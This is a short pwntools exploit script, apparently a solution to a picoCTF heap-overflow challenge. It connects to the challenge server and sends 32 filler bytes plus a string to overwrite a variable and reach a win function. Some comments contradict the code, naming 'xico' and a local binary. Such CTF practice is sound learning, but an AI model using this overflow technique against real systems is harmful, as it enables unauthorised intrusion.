from pwn import *

# If pwntools isn't installed: pip install pwntools

# Start the vulnerable binary locally
hostname = "tethys.picoctf.net"  
port = 61581
p = remote(hostname, port)

# Step 1: Receive initial heap info
p.recvuntil(b'Enter your choice:')

# Step 2: Choose option 2 to write to buffer
p.sendline(b'2')

# Step 3: Send crafted payload
# 32 bytes junk + "xico" to overwrite safe_var
payload = b'A' * 32 + b'hello_overflow'
p.sendline(payload)

# Step 4: Choose option 4 to trigger check_win
p.recvuntil(b'Enter your choice:')
p.sendline(b'4')

# Step 5: Receive output
print(p.recvall().decode())